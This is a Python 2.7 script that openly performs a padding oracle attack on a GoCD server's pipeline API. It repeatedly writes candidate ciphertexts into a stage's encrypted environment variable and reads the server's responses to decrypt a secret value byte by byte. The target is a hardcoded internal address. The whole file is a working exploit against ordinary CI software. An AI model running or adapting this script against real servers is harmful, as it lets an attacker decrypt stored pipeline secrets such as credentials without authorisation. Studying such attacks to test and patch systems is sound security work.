#! /usr/bin/env python2.7

'''
Perform Padding Oracle Attack.
Configuration - pipeline: foo; stage: mindsweeper-stg.
'''

from __future__ import print_function

import sys
import json
import time
import socket
import logging
from urllib import quote, unquote
from base64 import b64encode, b64decode

import requests
from paddingoracle import BadPaddingException, PaddingOracle


class PadBuster(PaddingOracle):
    '''
    Container class.
    '''
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.wait = kwargs.get('wait', 2.0)
        self.url = 'http://192.168.0.146:8153/go/api/admin/pipelines/foo'
        self.headers = {
            'Accept': 'application/vnd.go.cd.v1+json'
        }

    def oracle(self, data, **kwargs):
        token = quote(b64encode(data))

        while 1:
            response = requests.get(self.url, headers=self.headers)
            exclude = ['environment_variables', 'tracking_tool',
                       '_links', 'timer', 'parameters']

            data = response.json()
            p_headers = {
                'Accept': 'application/vnd.go.cd.v1+json',
                'Content-Type': 'application/json',
                'If-Match': response.headers['ETag']
            }

            p_data = {k: v for k, v in data.items() if k not in exclude}
            try:
                p_data['stages'][0]['environment_variables'][0][('encrypted_'
                                                                 'value')] = \
                                                                 token
                response = requests.put(self.url, data=json.dumps(p_data),
                                        headers=p_headers)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        if response.ok:
            logging.debug('No padding exception raised on %r', token)
            return

        raise BadPaddingException


def main():
    '''
    Begin here.
    '''
    if not sys.argv[1:]:
        print('Usage: %s <somecookie value>' % (sys.argv[0], ))
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)

    encrypted_cookie = b64decode(unquote(sys.argv[1]))

    padbuster = PadBuster()

    cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

    print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))


if __name__ == '__main__':
    main()
